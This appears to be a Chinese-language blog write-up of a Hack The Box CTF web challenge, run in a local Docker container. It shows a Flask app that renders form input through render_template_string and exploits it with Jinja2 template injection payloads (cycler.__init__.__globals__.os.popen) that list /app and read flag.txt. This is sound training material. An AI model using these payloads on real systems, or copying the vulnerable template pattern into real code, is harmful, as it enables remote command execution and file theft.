---
date: '2025-06-18T16:50:58+08:00'
draft: false
title: 'CTF_Trial-by-Fire'
tags: [ "CTF", "web", "Docker"]
---

# Trial_by_Fire

這次打的題目是 2025 HTB 上的

<!--more-->

## Description

建立容器 : `docker build --tag=web_trial_by_fire .`

啟動容器 : `docker run -p 1337:1337 -it --name=web_trial_by_fire web_trial_by_fire`

用Burp Suite 連線到 http://localhost:1337/

出現以下畫面
![image](https://hackmd.io/_uploads/Byfd6TXBxx.png)


## Solution

輸入使用者名稱( admin )後轉到 http://localhost:1337/flamedrake

![image](https://hackmd.io/_uploads/HJhpp6Qrlx.png)


不知道要幹嘛就三個按鈕都點了一遍

看起來結果是輸了，跳轉到 http://localhost:1337/battle-report

![image](https://hackmd.io/_uploads/SkkSCaQSgx.png)

觀察 source code

`routes.py` 程式碼

```python= 
from flask import render_template, request, render_template_string, Blueprint, session, redirect, url_for
import random

web = Blueprint('web', __name__)

DRAGON_TAUNTS = [
    "Your weakness betrays you, mortal!",
    "You dare challenge the guardian of the Emberstone?",
    "Your path is shrouded in flame! Seek wisdom before you burn!",
    "Centuries of warriors have fallen before me!",
    "Your efforts amuse me, tiny one!"
]

@web.route('/')
def index():
    return render_template('index.html')

@web.route('/begin', methods=['POST'])
def begin_journey():
    warrior_name = request.form.get('warrior_name', '').strip()
    if not warrior_name:
        return redirect(url_for('web.index'))

    session['warrior_name'] = warrior_name
    return render_template('intro.html', warrior_name=warrior_name)

@web.route('/flamedrake')
def flamedrake():
    warrior_name = session.get('warrior_name')
    if not warrior_name:
        return redirect(url_for('web.index'))
    return render_template("flamedrake.html", warrior_name=warrior_name)

@web.route('/battle-report', methods=['POST'])
def battle_report():
    warrior_name = session.get("warrior_name", "Unknown Warrior")
    battle_duration = request.form.get('battle_duration', "0")

    stats = {
        'damage_dealt': request.form.get('damage_dealt', "0"),
        'damage_taken': request.form.get('damage_taken', "0"),
        'spells_cast': request.form.get('spells_cast', "0"),
        'turns_survived': request.form.get('turns_survived', "0"),
        'outcome': request.form.get('outcome', 'defeat')
    }

    REPORT_TEMPLATE = f"""
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Battle Report - The Flame Peaks</title>
        <link rel="icon" type="image/png" href="/static/images/favicon.png" />
        <link href="https://unpkg.com/nes.css@latest/css/nes.min.css" rel="stylesheet" />
        <link rel="stylesheet" href="/static/css/style.css">
    </head>
    <body>
        <div class="nes-container with-title is-dark battle-report">
            <p class="title">Battle Report</p>

            <div class="warrior-info">
                <i class="nes-icon is-large heart"></i>
                <p class="nes-text is-primary warrior-name">{warrior_name}</p>
            </div>

            <div class="report-stats">
                <div class="nes-container is-dark with-title stat-group">
                    <p class="title">Battle Statistics</p>
                    <p>🗡️ Damage Dealt: <span class="nes-text is-success">{stats['damage_dealt']}</span></p>
                    <p>💔 Damage Taken: <span class="nes-text is-error">{stats['damage_taken']}</span></p>
                    <p>✨ Spells Cast: <span class="nes-text is-warning">{stats['spells_cast']}</span></p>
                    <p>⏱️ Turns Survived: <span class="nes-text is-primary">{stats['turns_survived']}</span></p>
                    <p>⚔️ Battle Duration: <span class="nes-text is-secondary">{float(battle_duration):.1f} seconds</span></p>
                </div>

                <div class="nes-container is-dark battle-outcome {stats['outcome']}">
                    <h2 class="nes-text is-primary">
                        {"🏆 Glorious Victory!" if stats['outcome'] == "victory" else "💀 Valiant Defeat"}
                    </h2>
                    <p class="nes-text">{random.choice(DRAGON_TAUNTS)}</p>
                </div>
            </div>

            <div class="report-actions nes-container is-dark">
                <a href="/flamedrake" class="nes-btn is-primary">⚔️ Challenge Again</a>
                <a href="/" class="nes-btn is-error">🏰 Return to Entrance</a>
            </div>
        </div>
    </body>
    </html>
    """

    return render_template_string(REPORT_TEMPLATE)
```
<div class="warning-box">
<strong>

1. 看到 flask 首先想到 SSTI、模板注入

2. 接著`routes.py`最後`return render_template_string(REPORT_TEMPLATE)`

3. `render_template_string` 會在渲染模板的時候會把{undefined{**}}的內容當作變數替換
    
    參考來源 : [render_template_string](https://blog.csdn.net/weixin_53146913/article/details/124274968)

4. `REPORT_TEMPLATE` 裡面的內容包含 : 玩家名稱、傷害輸出、傷害承受和結果（victory/defeat）等等，並用 f-string 包裝成拼接的 HTML 模板
</strong> 
</div>


去看 Burp 的 Target ，點開剛剛跳轉到的 `/battle-report` 

發現最下面的地方跟我們觀察的一樣，有顯示 damage_dealt 、 outcome 等

![image](https://hackmd.io/_uploads/ByH69R7Hle.png)

嘗試模板注入，先試最常使用的 `{{7*7}}`，如果顯示49表示成功，可以注入

![image](https://hackmd.io/_uploads/r1v3iC7Hxl.png)

接下來觀察其他檔案，找出 flag 所在位置

`Dockerfile` 程式碼

```code=
FROM node:20-alpine

# Add a non-root user (www)
RUN adduser -D www

# Install system packages
RUN apk add --update --no-cache supervisor nginx python3 py3-pip uwsgi uwsgi-python3


# Create application directory
RUN mkdir -p /app
WORKDIR /app

# Copy backend code and requirements from challenge/backend into /app/backend
COPY challenge  .

# Upgrade pip and install backend dependencies using a virtual environment
RUN python3 -m venv venv
RUN /app/venv/bin/pip install --upgrade pip
RUN . /app/venv/bin/activate && pip install -r requirements.txt

# Return to the app root
WORKDIR /app

# Fix permissions for security
RUN chown -R www:www /app
RUN chown -R www:www /var/lib/nginx

# Copy Supervisord and Nginx configuration files
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf

# Expose the port (nginx is configured to serve on port 1337)
EXPOSE 1337

# Prevent Python from writing .pyc files
ENV PYTHONDONTWRITEBYTECODE=1

# Start supervisord (which will launch Gunicorn for Flask, Node for frontend, and Nginx)
ENTRYPOINT ["supervisord", "-c", "/etc/supervisord.conf"]
```

<div class="warning-box">
<strong>
11-12行 : 建立 /app 目錄並切換工作目錄

26-27行 : 將 /app 與 /var/lib/nginx 的擁有者改為 www
</strong> 
</div>

由此可見 `/app` 可能包含重要訊息

在剛剛注入的地方輸入
`{{ cycler.__init__.__globals__.os.popen("ls /app").read() }}`
![image](https://hackmd.io/_uploads/ry_caRmSlg.png)


<div class="warning-box">
<strong>
cycler　是　Jinja2 內建的，利用 __init__ 方法將 class instance，再利用 __globals__ 執行 os.popen，列出 /app 的目錄檔案，最後透過 .read() 讀出結果
</strong> 
</div>

找到名為 `flag.txt` 的檔案

最後輸入
`{{ cycler.__init__.__globals__.os.popen("cat /app/flag.txt").read() }}`
![image](https://hackmd.io/_uploads/rJTZAC7Bll.png)


參考資料 : [iThome_SSTI](https://ithelp.ithome.com.tw/m/articles/10272749)
## Flag

<div class="flag-box">
<strong>
flag : HTB{f4k3_fl4g_f0r_t3st1ng}
</strong>
</div>
